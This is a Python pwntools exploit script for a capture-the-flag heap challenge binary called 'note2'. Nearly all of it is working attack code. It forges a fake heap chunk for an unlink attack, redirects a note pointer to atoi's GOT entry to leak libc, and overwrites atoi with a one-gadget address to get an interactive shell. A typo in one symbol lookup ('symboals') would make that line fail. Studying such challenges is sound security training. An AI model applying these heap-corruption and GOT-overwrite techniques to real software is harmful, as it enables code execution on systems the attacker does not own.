# coding=UTF-8
from pwn import *

p = process('./note2')
elf = ELF('./note2')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
context.log_level = 'debug'


def newnote(length, content):
    p.recvuntil('option--->>')
    p.sendline('1')
    p.recvuntil('(less than 128)')
    p.sendline(str(length))
    p.recvuntil('content:')
    p.sendline(content)


def shownote(id):
    p.recvuntil('option--->>')
    p.sendline('2')
    p.recvuntil('note:')
    p.sendline(str(id))


def editnote(id, choice, s):
    p.recvuntil('option--->>')
    p.sendline('3')
    p.recvuntil('note:')
    p.sendline(str(id))
    p.recvuntil('2.append]')
    p.sendline(str(choice))
    p.sendline(s)


def deletenote(id):
    p.recvuntil('option--->>')
    p.sendline('4')
    p.recvuntil('note:')
    p.sendline(str(id))

chunk_ptr = 0x0000000000602120
free_got = elf.got['free']
atoi_got = elf.got['atoi']

p.recvuntil('name:')
p.sendline('skye')
p.recvuntil('address:')
p.sendline('skye')

payload = p64(0)+p64(0xa1)
payload += p64(chunk_ptr-0x18) + p64(chunk_ptr-0x10)

newnote(0x80,payload)
newnote(0,'b'*8)
newnote(0x80,'c'*8)

deletenote(1)
payload = 'a'*0x10
payload += p64(0xa0) + p64(0x90)
newnote(0,payload)
gdb.attach(p,'b *0x401028')
deletenote(2)

payload = 'a'*0x18 + p64(atoi_got)
editnote(0,1,payload)
shownote(0)

p.recvuntil("Content is ")
leak_addr = u64(p.recv(6).ljust(8,'\x00'))
libc_base = leak_addr - libc.symboals['atoi']
system_addr = libc_base + libc.symbols['system']
onegadget = libc_base + 0xf1207
log.info("leak_addr:"+hex(leak_addr))
log.info("libc_base:"+hex(libc_base))
log.info("system_addr:"+hex(system_addr))
log.info("onegadget:"+hex(onegadget))

payload = p64(onegadget)
editnote(0,1,payload)


p.sendline('skye')
p.interactive()



